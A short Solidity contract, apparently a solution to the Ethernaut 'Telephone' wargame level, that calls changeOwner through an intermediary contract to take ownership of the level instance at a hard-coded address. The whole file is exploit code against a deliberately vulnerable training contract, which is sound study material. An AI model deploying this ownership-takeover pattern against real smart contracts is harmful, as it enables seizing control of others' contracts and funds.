// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}
contract TelephoneAttacker {

  ITelephone public ethernautInstance;

  constructor(address _ethernautInstance) public {
    ethernautInstance = ITelephone(_ethernautInstance);
  }

  function attack() external {
    ethernautInstance.changeOwner(0xEc948CC31227f0359717c69489cEe7BE7aEFbFD1);
  }
}